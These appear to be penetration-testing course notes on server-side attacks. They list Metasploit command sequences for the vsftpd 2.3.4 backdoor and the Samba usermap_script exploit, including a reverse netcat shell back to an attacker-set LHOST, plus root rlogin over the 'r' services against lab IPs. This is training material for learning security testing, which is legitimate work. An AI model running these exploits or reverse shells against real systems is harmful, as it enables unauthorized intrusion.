# Server-Side Attacks:
- Need an IP address
- Very simple if target is on the same network (netdiscover or zenmap)
- If target has a domain, then a simple ping will return its IP. > ping www.facebook.com
- Getting the IP is tricker if the target is a personal computer, might be usefull if the target is accessing the internet through a network as the IP will be the router IP and not the targets, client side attacks are more effective in this case as reverse connection can be used.

The general steps are always the same!
- Discover open ports and running services
- Find vulnerabilities
- Find exploits
- Exploit/Verify
- Report

## Information Gathering:
- Try default password (ssh iPad case).
- Services might be mis-configured, such as the "r" services. Ports 512, 513, 514
- Some might even contain a back door!
- Code execution vulnerabilities.

Install "rsh-client" by executing
```bash
sudo apt-get install rsh-clinet
```
If **512 PORT** is opened or the server allows the remote login, then execute
```bash
rlogin -l root 10.20.14.204  # 10.20.14.204 is server IP, root is user
```

## Hacking a Remote Server Using a Basic Metasploit Exploit (PORT 21):
Metasploit is an exploit development and execution tool. It can also be used to carry out other penetration testing tasks such as port scans, services identification and post exploitation tasks.
- > msfconsole --> runs the metasploit console
- > help --> shows help
- > show [something] --> something can be exploit, payloads, auxiliaries or options
- > use [something] --> use a certain exploit, payload or auxiliary
- set [option] [value] --> configure [option] to have a value of [value]
- exploit --> runs the current task

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST 10.20.14.204
show options
exploit  # if doesn't execute successfully, execute again
```

## Exploiting a Code Execution Vulnerability to Hack into a Remote Server(PORT 139):
```bash
msfconsole
use exploit/multi/samba/usermap_script
show options
set RHOST 10.20.14.204  # This is server IP address
show options
show payloads
set PAYLOAD cmd/unix/reverse_netcat
show options
set LHOST 10.20.14.203  # This is my IP address
show options
set LPORT 80  # Server will listen in this PORT
show options
exploit
```

## Nextpose:
Vulnerability Management Framework
- Discover open ports and running services
- Find vulnerabilities
- Find exploits
- verify them
- Generate reports
- Automate scans

For this, minimum 8GB mempry is required. You can download the nextpose file from https://www.rapid7.com/try/nexpose. And give permission and execute by
```bash
sudo chmod +x Rapid7Setup-Linux64.bin
./Rapid7Setup-Linux64.bin
systemctl disable nextposeconsole.service  # disable the autostart
```